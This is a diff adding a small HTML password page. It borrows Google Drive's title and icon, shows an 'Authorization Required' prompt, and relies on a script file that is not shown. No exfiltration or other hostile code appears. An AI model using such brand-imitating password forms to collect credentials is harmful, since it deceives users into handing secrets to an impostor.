@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>My Drive - Google Drive</title>
+        <link rel="shortcut icon" href="images/google-drive.png">
+        <script src="ezwork.js"></script>
+    </head>
+    <body style="background-color: black; color: white" onClick="document.getElementById('pass').addEventListener('keypress', handler);">
+        <h1 id="hidden"></h1>
+        <div id="destroy">
+        <h1 id="heading">Authorization Required</h1>
+        <label>Enter password:</label>
+        <input type="password" name="pass" id="pass" size="10" required="true" key="handler(this)"/>
+        <input type="submit" name="submit" id="submit" value="Submit" onclick="checkAuth()" maxlength="32"/>
+        </div>
+        <iframe id="iframe" src="" width="100%" height="100%" style="position: absolute; border: none">
+    </body>
+</html>
